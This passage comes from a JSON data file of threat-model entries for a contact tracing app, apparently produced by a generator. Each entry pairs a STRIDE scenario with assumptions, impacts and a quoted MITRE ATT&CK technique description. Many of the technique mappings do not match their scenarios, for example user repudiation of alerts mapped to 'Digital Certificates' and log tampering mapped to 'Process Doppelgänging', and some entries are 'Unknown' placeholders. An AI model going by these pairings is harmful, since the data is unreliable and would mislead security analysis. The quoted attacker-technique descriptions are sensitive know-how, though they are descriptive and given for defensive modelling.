                    "Condition": "When there is a lack of DDoS mitigation solutions in place."
                }
            ],
            "Potential Impact": "Disruption of the server's ability to process legitimate data, affecting system availability.",
            "MITRE ATT&CK Keywords": [
                "DoS attack",
                "DDoS",
                "fake data submission",
                "system overload"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Malware could be used to infect user devices and disable the contact tracing app.",
            "Assumptions": [
                {
                    "Assumption": "User devices lack adequate malware protection.",
                    "Role": "User",
                    "Condition": "When devices do not have updated anti-malware software installed."
                },
                {
                    "Assumption": "Malware can gain the necessary permissions on user devices.",
                    "Role": "User Device",
                    "Condition": "When users unknowingly grant excessive permissions to apps."
                },
                {
                    "Assumption": "There are known vulnerabilities in the app that malware can exploit.",
                    "Role": "Application Developer",
                    "Condition": "When the app contains unpatched security vulnerabilities."
                }
            ],
            "Potential Impact": "Inability to use the app for contact tracing, impacting public health efforts.",
            "MITRE ATT&CK Keywords": [
                "malware",
                "app disablement",
                "device compromise",
                "service disruption"
            ],
            "mitre_technique": {
                "name": "Disk Structure Wipe",
                "description": "Adversaries may corrupt or wipe the disk data structures on a hard drive necessary to boot a system; targeting specific critical systems or in large numbers in a network to interrupt availability to system and network resources. \n\nAdversaries may attempt to render the system unable to boot by overwriting critical data located in structures such as the master boot record (MBR) or partition table.(Citation: Symantec Shamoon 2012)(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)(Citation: Unit 42 Shamoon3 2018) The data contained in disk structures may include the initial executable code for loading an operating system or the location of the file system partitions on disk. If this information is not present, the computer will not be able to load an operating system during the boot process, leaving the computer unavailable. [Disk Structure Wipe](https://attack.mitre.org/techniques/T1561/002) may be performed in isolation, or along with [Disk Content Wipe](https://attack.mitre.org/techniques/T1561/001) if all sectors of a disk are wiped.\n\nOn a network devices, adversaries may reformat the file system using [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as `format`.(Citation: format_cmd_cisco)\n\nTo maximize impact on the target organization, malware designed for destroying disk structures may have worm-like features to propagate across a network by leveraging other techniques like [Valid Accounts](https://attack.mitre.org/techniques/T1078), [OS Credential Dumping](https://attack.mitre.org/techniques/T1003), and [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002).(Citation: Symantec Shamoon 2012)(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)",
                "id": "attack-pattern--0af0ca99-357d-4ba1-805f-674fdfb7bef9",
                "technique_id": "T1561.002"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker could target the communication channels between user devices and servers to block data transmission.",
            "Assumptions": [
                {
                    "Assumption": "The communication channels are not secured against interference.",
                    "Role": "Application Developer",
                    "Condition": "When channels do not use established security protocols like TLS."
                },
                {
                    "Assumption": "Attackers have the capability to intercept or jam communications.",
                    "Role": "Attacker",
                    "Condition": "When attackers position devices to disrupt communication lines."
                },
                {
                    "Assumption": "There is no redundancy in the communication infrastructure.",
                    "Role": "System Administrator",
                    "Condition": "When there are no fallback mechanisms for communication failures."
                }
            ],
            "Potential Impact": "Loss of data transmission leading to incomplete and inaccurate proximity records.",
            "MITRE ATT&CK Keywords": [
                "communication disruption",
                "data transmission blocking",
                "network jamming"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker could exploit a vulnerability in the app to gain higher privileges on user devices.",
            "Assumptions": [
                {
                    "Assumption": "The app contains unpatched vulnerabilities.",
                    "Role": "Application Developer",
                    "Condition": "When known vulnerabilities are not addressed in a timely manner."
                },
                {
                    "Assumption": "User devices do not have up-to-date security protections.",
                    "Role": "User",
                    "Condition": "When devices lack the latest security updates and patches."
                },
                {
                    "Assumption": "The attacker has the means to deploy exploit tools.",
                    "Role": "Attacker",
                    "Condition": "When attackers can distribute and execute malicious payloads."
                }
            ],
            "Potential Impact": "Compromise of device security and unauthorized access to sensitive data and functions.",
            "MITRE ATT&CK Keywords": [
                "privilege escalation",
                "vulnerability exploitation",
                "device compromise",
                "security bypass"
            ],
            "mitre_technique": {
                "name": "DLL Search Order Hijacking",
                "description": "Adversaries may execute their own malicious payloads by hijacking the search order used to load DLLs. Windows systems use a common method to look for required DLLs to load into a program. (Citation: Microsoft Dynamic Link Library Search Order)(Citation: FireEye Hijacking July 2010) Hijacking DLL loads may be for the purpose of establishing persistence as well as elevating privileges and/or evading restrictions on file execution.\n\nThere are many ways an adversary can hijack DLL loads. Adversaries may plant trojan dynamic-link library files (DLLs) in a directory that will be searched before the location of a legitimate library that will be requested by a program, causing Windows to load their malicious library when it is called for by the victim program. Adversaries may also perform DLL preloading, also called binary planting attacks, (Citation: OWASP Binary Planting) by placing a malicious DLL with the same name as an ambiguously specified DLL in a location that Windows searches before the legitimate DLL. Often this location is the current working directory of the program.(Citation: FireEye fxsst June 2011) Remote DLL preloading attacks occur when a program sets its current directory to a remote location such as a Web share before loading a DLL. (Citation: Microsoft Security Advisory 2269637)\n\nPhantom DLL hijacking is a specific type of DLL search order hijacking where adversaries target references to non-existent DLL files.(Citation: Adversaries Hijack DLLs) They may be able to load their own malicious DLL by planting it with the correct name in the location of the missing module.\n\nAdversaries may also directly modify the search order via DLL redirection, which after being enabled (in the Registry and creation of a redirection file) may cause a program to load a different DLL.(Citation: Microsoft Dynamic-Link Library Redirection)(Citation: Microsoft Manifests)(Citation: FireEye DLL Search Order Hijacking)\n\nIf a search order-vulnerable program is configured to run at a higher privilege level, then the adversary-controlled DLL that is loaded will also be executed at the higher level. In this case, the technique could be used for privilege escalation from user to administrator or SYSTEM or from administrator to SYSTEM, depending on the program. Programs that fall victim to path hijacking may appear to behave normally because malicious DLLs may be configured to also load the legitimate DLLs they were meant to replace.",
                "id": "attack-pattern--2fee9321-3e71-4cf4-af24-d4d40d355b34",
                "technique_id": "T1574.001"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "A user with normal access could exploit application flaws to gain administrative control over the central server.",
            "Assumptions": [
                {
                    "Assumption": "Application flaws exist that can be exploited for privilege escalation.",
                    "Role": "Application Developer",
                    "Condition": "When the application has unmitigated security weaknesses."
                },
                {
                    "Assumption": "The server does not enforce robust access controls.",
                    "Role": "System Administrator",
                    "Condition": "When access controls are weak or improperly configured."
                },
                {
                    "Assumption": "The user has some level of access to interface with the server.",
                    "Role": "User",
                    "Condition": "When the user can interact with the server through legitimate means."
                }
            ],
            "Potential Impact": "Full control over the server, potential data breach, and system manipulation.",
            "MITRE ATT&CK Keywords": [
                "server privilege escalation",
                "administrative control",
                "access control bypass",
                "system manipulation"
            ],
            "mitre_technique": {
                "name": "Trusted Relationship",
                "description": "Adversaries may breach or otherwise leverage organizations who have access to intended victims. Access through trusted third party relationship abuses an existing connection that may not be protected or receives less scrutiny than standard mechanisms of gaining access to a network.\n\nOrganizations often grant elevated access to second or third-party external providers in order to allow them to manage internal systems as well as cloud-based environments. Some examples of these relationships include IT services contractors, managed security providers, infrastructure contractors (e.g. HVAC, elevators, physical security). The third-party provider's access may be intended to be limited to the infrastructure being maintained, but may exist on the same network as the rest of the enterprise. As such, [Valid Accounts](https://attack.mitre.org/techniques/T1078) used by the other party for access to internal network systems may be compromised and used.(Citation: CISA IT Service Providers)\n\nIn Office 365 environments, organizations may grant Microsoft partners or resellers delegated administrator permissions. By compromising a partner or reseller account, an adversary may be able to leverage existing delegated administrator relationships or send new delegated administrator offers to clients in order to gain administrative control over the victim tenant.(Citation: Office 365 Delegated Administration)",
                "id": "attack-pattern--9fa07bef-9c81-421e-a8e5-ad4366c5a925",
                "technique_id": "T1199"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "A malicious application could exploit weaknesses in the contact tracing app to gain elevated privileges on user devices.",
            "Assumptions": [
                {
                    "Assumption": "The contact tracing app has exploitable weaknesses.",
                    "Role": "Application Developer",
                    "Condition": "When security vulnerabilities are not adequately mitigated."
                },
                {
                    "Assumption": "Users install apps with excessive permissions.",
                    "Role": "User",
                    "Condition": "When users grant permissions without understanding the risks."
                },
                {
                    "Assumption": "Malicious apps are not detected and removed in a timely manner.",
                    "Role": "Device Security",
                    "Condition": "When security software on the device is outdated or disabled."
                }
            ],
            "Potential Impact": "Elevation of privileges leading to unauthorized actions and access to sensitive information.",
            "MITRE ATT&CK Keywords": [
                "malicious app",
                "privilege escalation",
                "exploitable weaknesses",
                "elevated permissions"
            ],
            "mitre_technique": {
                "name": "File System Permissions Weakness",
                "description": "Processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself, are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.\n\nAdversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.\n\n### Services\n\nManipulation of Windows service binaries is one variation of this technique. Adversaries may replace a legitimate service executable with their own executable to gain persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService). Once the service is started, either directly by the user (if appropriate access is available) or through some other means, such as a system restart if the service starts on bootup, the replaced executable will run instead of the original service executable.\n\n### Executable Installers\n\nAnother variation of this technique can be performed by taking advantage of a weakness that is common in executable, self-extracting installers. During the installation process, it is common for installers to use a subdirectory within the <code>%TEMP%</code> directory to unpack binaries such as DLLs, EXEs, or other payloads. When installers create subdirectories and files they often do not set appropriate permissions to restrict write access, which allows for execution of untrusted code placed in the subdirectories or overwriting of binaries used in the installation process. This behavior is related to and may take advantage of [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1038). Some installers may also require elevated privileges that will result in privilege escalation when executing adversary controlled code. This behavior is related to [Bypass User Account Control](https://attack.mitre.org/techniques/T1088). Several examples of this weakness in existing common installers have been reported to software vendors. (Citation: Mozilla Firefox Installer DLL Hijack) (Citation: Seclists Kanthak 7zip Installer)",
                "id": "attack-pattern--0ca7beef-9bbc-4e35-97cf-437384ddce6a",
                "technique_id": "T1044"
            }
        }
    ]
},
{
    "case_number": "10",
    "batch_number": "28",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker impersonates a legitimate user to gain access to the contact tracing app's centralized server.",
            "Assumptions": [
                {
                    "Assumption": "Attacker has sufficient knowledge to mimic legitimate user behavior.",
                    "Role": "Attacker",
                    "Condition": "Attacker needs access to user-specific data such as mobile number or email."
                },
                {
                    "Assumption": "No strong authentication mechanisms in place.",
                    "Role": "System",
                    "Condition": "Application lacks multi-factor authentication."
                },
                {
                    "Assumption": "Centralized server does not thoroughly validate user credentials.",
                    "Role": "System",
                    "Condition": "Inadequate server-side validation checks."
                }
            ],
            "Potential Impact": "Unauthorized access to user data, leading to a breach of data confidentiality and potential misuse of sensitive health information.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "credential access",
                "network",
                "device"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker creates a fake contact tracing app to trick users into installing it and providing sensitive information.",
            "Assumptions": [
                {
                    "Assumption": "Users are unaware of how to verify legitimate apps.",
                    "Role": "User",
                    "Condition": "Users lack awareness about app verification methods."
                },
                {
                    "Assumption": "No stringent app store screening processes.",
                    "Role": "App Store",
                    "Condition": "Application stores do not have rigorous app vetting policies."
                },
                {
                    "Assumption": "Attackers have access to channels to distribute fake apps widely.",
                    "Role": "Attacker",
                    "Condition": "Available distribution methods are easy to exploit."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of user data, identity theft, and potential secondary attacks.",
            "MITRE ATT&CK Keywords": [
                "impersonation",
                "social engineering",
                "application",
                "malware"
            ],
            "mitre_technique": {
                "name": "Indicator Removal from Tools",
                "description": "If a malicious tool is detected and quarantined or otherwise curtailed, an adversary may be able to determine why the malicious tool was detected (the indicator), modify the tool by removing the indicator, and use the updated version that is no longer detected by the target's defensive systems or subsequent targets that may use similar systems.\n\nA good example of this is when malware is detected with a file signature and quarantined by anti-virus software. An adversary who can determine that the malware was quarantined because of its file signature may use [Software Packing](https://attack.mitre.org/techniques/T1045) or otherwise modify the file so it has a different signature, and then re-use the malware.",
                "id": "attack-pattern--00d0b012-8a03-410e-95de-5826bf542de6",
                "technique_id": "T1066"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker sends false exposure alerts to users, causing panic and misinformation.",
            "Assumptions": [
                {
                    "Assumption": "Attacker can intercept and manipulate network traffic.",
                    "Role": "Attacker",
                    "Condition": "Access to insecure communication channels."
                },
                {
                    "Assumption": "Users trust and act on notifications from the app without verification.",
                    "Role": "User",
                    "Condition": "High trust placed in app notifications."
                },
                {
                    "Assumption": "No end-to-end encryption for alerts and notifications.",
                    "Role": "System",
                    "Condition": "Application lacks strong encryption protocols."
                }
            ],
            "Potential Impact": "Loss of trust in the application, potential disruption to public health response actions, and user data manipulation.",
            "MITRE ATT&CK Keywords": [
                "phishing",
                "network traffic",
                "data manipulation",
                "notification"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker modifies the application code to alter its functionality.",
            "Assumptions": [
                {
                    "Assumption": "Access to the application's source code or binary files.",
                    "Role": "Attacker",
                    "Condition": "Code is not securely housed or protected."
                },
                {
                    "Assumption": "Application does not detect or prevent code integrity violations.",
                    "Role": "System",
                    "Condition": "No code integrity verification mechanisms in place."
                },
                {
                    "Assumption": "Distribution of modified app through unofficial channels.",
                    "Role": "Attacker",
                    "Condition": "Users are likely to download the app from unofficial sources."
                }
            ],
            "Potential Impact": "Corruption of data integrity, unauthorized data collection, and potential backdoor introduction.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "code modification",
                "binary",
                "distribution"
            ],
            "mitre_technique": {
                "name": "LC_LOAD_DYLIB Addition",
                "description": "Mach-O binaries have a series of headers that are used to perform certain operations when a binary is loaded. The LC_LOAD_DYLIB header in a Mach-O binary tells macOS and OS X which dynamic libraries (dylibs) to load during execution time. These can be added ad-hoc to the compiled binary as long adjustments are made to the rest of the fields and dependencies (Citation: Writing Bad Malware for OSX). There are tools available to perform these changes. Any changes will invalidate digital signatures on binaries because the binary is being modified. Adversaries can remediate this issue by simply removing the LC_CODE_SIGNATURE command from the binary so that the signature isn\u2019t checked at load time (Citation: Malware Persistence on OS X).",
                "id": "attack-pattern--04ef4356-8926-45e2-9441-634b6f3dcecb",
                "technique_id": "T1161"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker alters the logs in the centralized system to mask activities or create false entries.",
            "Assumptions": [
                {
                    "Assumption": "Access to log files with insufficient security controls.",
                    "Role": "Attacker",
                    "Condition": "Weak access control policies around log files."
                },
                {
                    "Assumption": "Logs are not regularly monitored for integrity.",
                    "Role": "System",
                    "Condition": "Lack of periodic log audits and verifications."
                },
                {
                    "Assumption": "Attackers can exploit vulnerabilities to gain unauthorized access.",
                    "Role": "Attacker",
                    "Condition": "Existence of exploitable vulnerabilities in log management."
                }
            ],
            "Potential Impact": "Data integrity issues, masking of malicious activities, and false data leading to incorrect public health decisions.",
            "MITRE ATT&CK Keywords": [
                "log manipulation",
                "data integrity",
                "masking",
                "central server"
            ],
            "mitre_technique": {
                "name": "Process Doppelg\u00e4nging",
                "description": "Adversaries may inject malicious code into process via process doppelg\u00e4nging in order to evade process-based defenses as well as possibly elevate privileges. Process doppelg\u00e4nging is a method of executing arbitrary code in the address space of a separate live process. \n\nWindows Transactional NTFS (TxF) was introduced in Vista as a method to perform safe file operations. (Citation: Microsoft TxF) To ensure data integrity, TxF enables only one transacted handle to write to a file at a given time. Until the write handle transaction is terminated, all other handles are isolated from the writer and may only read the committed version of the file that existed at the time the handle was opened. (Citation: Microsoft Basic TxF Concepts) To avoid corruption, TxF performs an automatic rollback if the system or application fails during a write transaction. (Citation: Microsoft Where to use TxF)\n\nAlthough deprecated, the TxF application programming interface (API) is still enabled as of Windows 10. (Citation: BlackHat Process Doppelg\u00e4nging Dec 2017)\n\nAdversaries may abuse TxF to a perform a file-less variation of [Process Injection](https://attack.mitre.org/techniques/T1055). Similar to [Process Hollowing](https://attack.mitre.org/techniques/T1055/012), process doppelg\u00e4nging involves replacing the memory of a legitimate process, enabling the veiled execution of malicious code that may evade defenses and detection. Process doppelg\u00e4nging's use of TxF also avoids the use of highly-monitored API functions such as <code>NtUnmapViewOfSection</code>, <code>VirtualProtectEx</code>, and <code>SetThreadContext</code>. (Citation: BlackHat Process Doppelg\u00e4nging Dec 2017)\n\nProcess Doppelg\u00e4nging is implemented in 4 steps (Citation: BlackHat Process Doppelg\u00e4nging Dec 2017):\n\n* Transact \u2013 Create a TxF transaction using a legitimate executable then overwrite the file with malicious code. These changes will be isolated and only visible within the context of the transaction.\n* Load \u2013 Create a shared section of memory and load the malicious executable.\n* Rollback \u2013 Undo changes to original executable, effectively removing malicious code from the file system.\n* Animate \u2013 Create a process from the tainted section of memory and initiate execution.\n\nThis behavior will likely not result in elevated privileges since the injected process was spawned from (and thus inherits the security context) of the injecting process. However, execution via process doppelg\u00e4nging may evade detection from security products since the execution is masked under a legitimate process. ",
                "id": "attack-pattern--7007935a-a8a7-4c0b-bd98-4e85be8ed197",
                "technique_id": "T1055.013"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker modifies the rolling keys in the decentralized architecture, skewing exposure notifications.",
            "Assumptions": [
                {
                    "Assumption": "Access to device storage where rolling keys are stored.",
                    "Role": "Attacker",
                    "Condition": "Physical or remote access to user devices."
                },
                {
                    "Assumption": "No strong encryption for stored keys.",
                    "Role": "System",
                    "Condition": "Weak or no encryption on key storage."
                },
                {
                    "Assumption": "No validation of keys before sending exposure notifications.",
                    "Role": "System",
                    "Condition": "Lack of checks on key authenticity."
                }
            ],
            "Potential Impact": "Erroneous exposure notifications, user panic and loss of trust in the app's reliability.",
            "MITRE ATT&CK Keywords": [
                "key tampering",
                "data integrity",
                "exposure notifications",
                "device storage"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user denies having received or acknowledged an exposure alert.",
            "Assumptions": [
                {
                    "Assumption": "No non-repudiation mechanisms (e.g., digital signatures) are in place for alerts.",
                    "Role": "System",
                    "Condition": "Lack of digital signatures for message verification."
                },
                {
                    "Assumption": "Application does not log user interactions with alerts.",
                    "Role": "System",
                    "Condition": "No comprehensive logging of user actions."
                },
                {
                    "Assumption": "Users can bypass alert acknowledgment without leaving a trace.",
                    "Role": "User",
                    "Condition": "Application allows users to dismiss alerts without records."
                }
            ],
            "Potential Impact": "Lack of accountability and potential data integrity issues, undermining public health efforts.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "non-repudiation",
                "alert acknowledgement",
                "digital signature"
            ],
            "mitre_technique": {
                "name": "Digital Certificates",
                "description": "Adversaries may buy and/or steal SSL/TLS certificates that can be used during targeting. SSL/TLS certificates are designed to instill trust. They include information about the key, information about its owner's identity, and the digital signature of an entity that has verified the certificate's contents are correct. If the signature is valid, and the person examining the certificate trusts the signer, then they know they can use that key to communicate with its owner.\n\nAdversaries may purchase or steal SSL/TLS certificates to further their operations, such as encrypting C2 traffic (ex: [Asymmetric Cryptography](https://attack.mitre.org/techniques/T1573/002) with [Web Protocols](https://attack.mitre.org/techniques/T1071/001)) or even enabling [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557) if the certificate is trusted or otherwise added to the root of trust (i.e. [Install Root Certificate](https://attack.mitre.org/techniques/T1553/004)). The purchase of digital certificates may be done using a front organization or using information stolen from a previously compromised entity that allows the adversary to validate to a certificate provider as that entity. Adversaries may also steal certificate materials directly from a compromised third-party, including from certificate authorities.(Citation: DiginotarCompromise) Adversaries may register or hijack domains that they will later purchase an SSL/TLS certificate for.\n\nCertificate authorities exist that allow adversaries to acquire SSL/TLS certificates, such as domain validation certificates, for free.(Citation: Let's Encrypt FAQ)\n\nAfter obtaining a digital certificate, an adversary may then install that certificate (see [Install Digital Certificate](https://attack.mitre.org/techniques/T1608/003)) on infrastructure under their control.",
                "id": "attack-pattern--19401639-28d0-4c3c-adcc-bc2ba22f6421",
                "technique_id": "T1588.004"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A malicious user denies responsibility for tampered data in their proximity log.",
            "Assumptions": [
                {
                    "Assumption": "Insufficient logging of user actions within the app.",
                    "Role": "System",
                    "Condition": "Lack of comprehensive activity logs."
                },
                {
                    "Assumption": "Users can alter logs without detection.",
                    "Role": "User",
                    "Condition": "Vulnerabilities in log integrity checks."
                },
                {
                    "Assumption": "No mechanisms to attribute actions to specific users.",
                    "Role": "System",
                    "Condition": "Absence of unique user activity tracking."
                }
            ],
            "Potential Impact": "Difficulty in tracking and mitigating malicious actions, potential data integrity and accountability issues.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "log tampering",
                "accountability",
                "user actions"
            ],
            "mitre_technique": {
                "name": "Indicator Removal",
                "description": "Adversaries may delete or modify artifacts generated within systems to remove evidence of their presence or hinder defenses. Various artifacts may be created by an adversary or something that can be attributed to an adversary\u2019s actions. Typically these artifacts are used as defensive indicators related to monitored events, such as strings from downloaded files, logs that are generated from user actions, and other data analyzed by defenders. Location, format, and type of artifact (such as command or login history) are often specific to each platform.\n\nRemoval of these indicators may interfere with event collection, reporting, or other processes used to detect intrusion activity. This may compromise the integrity of security solutions by causing notable events to go unreported. This activity may also impede forensic analysis and incident response, due to lack of sufficient data to determine what occurred.",
                "id": "attack-pattern--799ace7f-e227-4411-baa0-8868704f2a69",
                "technique_id": "T1070"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user who tested positive denies uploading their rolling keys, hampering tracking efforts.",
            "Assumptions": [
                {
                    "Assumption": "Users are trusted to upload keys without verification.",
                    "Role": "System",
                    "Condition": "System lacks enforcement mechanisms for key uploads."
                },
                {
                    "Assumption": "No secure means to verify the authenticity of uploaded keys.",
                    "Role": "System",
                    "Condition": "Absence of verification processes for uploaded data."
                },
                {
                    "Assumption": "Users can claim technical issues as reasons for non-compliance.",
                    "Role": "User",
                    "Condition": "Lack of documented compliance measures."
                }
            ],
            "Potential Impact": "Gaps in contact tracing data, which can hinder public health response and lead to undetected spread.",
            "MITRE ATT&CK Keywords": [
                "key uploading",
                "non-compliance",
                "data integrity",
                "verification"
            ],
            "mitre_technique": {
                "name": "Disable or Modify Tools",
                "description": "Adversaries may modify and/or disable security tools to avoid possible detection of their malware/tools and activities. This may take many forms, such as killing security software processes or services, modifying / deleting Registry keys or configuration files so that tools do not operate properly, or other methods to interfere with security tools scanning or reporting information. Adversaries may also disable updates to prevent the latest security patches from reaching tools on victim systems.(Citation: SCADAfence_ransomware)\n\nAdversaries may also tamper with artifacts deployed and utilized by security tools. Security tools may make dynamic changes to system components in order to maintain visibility into specific events. For example, security products may load their own modules and/or modify those loaded by processes to facilitate data collection. Similar to [Indicator Blocking](https://attack.mitre.org/techniques/T1562/006), adversaries may unhook or otherwise modify these features added by tools (especially those that exist in userland or are otherwise potentially accessible to adversaries) to avoid detection.(Citation: OutFlank System Calls)(Citation: MDSec System Calls) \n\nAdversaries may also focus on specific applications such as Sysmon. For example, the \u201cStart\u201d and \u201cEnable\u201d values in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Microsoft-Windows-Sysmon-Operational</code> may be modified to tamper with and potentially disable Sysmon logging.(Citation: disable_win_evt_logging) \n\nOn network devices, adversaries may attempt to skip digital signature verification checks by altering startup configuration files and effectively disabling firmware verification that typically occurs at boot.(Citation: Fortinet Zero-Day and Custom Malware Used by Suspected Chinese Actor in Espionage Operation)(Citation: Analysis of FG-IR-22-369)\n\nIn cloud environments, tools disabled by adversaries may include cloud monitoring agents that report back to services such as AWS CloudWatch or Google Cloud Monitor.\n\nFurthermore, although defensive tools may have anti-tampering mechanisms, adversaries may abuse tools such as legitimate rootkit removal kits to impair and/or disable these tools.(Citation: chasing_avaddon_ransomware)(Citation: dharma_ransomware)(Citation: demystifying_ryuk)(Citation: doppelpaymer_crowdstrike) For example, adversaries have used tools such as GMER to find and shut down hidden processes and antivirus software on infected systems.(Citation: demystifying_ryuk)\n\nAdditionally, adversaries may exploit legitimate drivers from anti-virus software to gain access to kernel space (i.e. [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068)), which may lead to bypassing anti-tampering features.(Citation: avoslocker_ransomware)",
                "id": "attack-pattern--ac08589e-ee59-4935-8667-d845e38fe579",
                "technique_id": "T1562.001"
            }
        },
        {
            "Threat Type": "Information Disclosure",
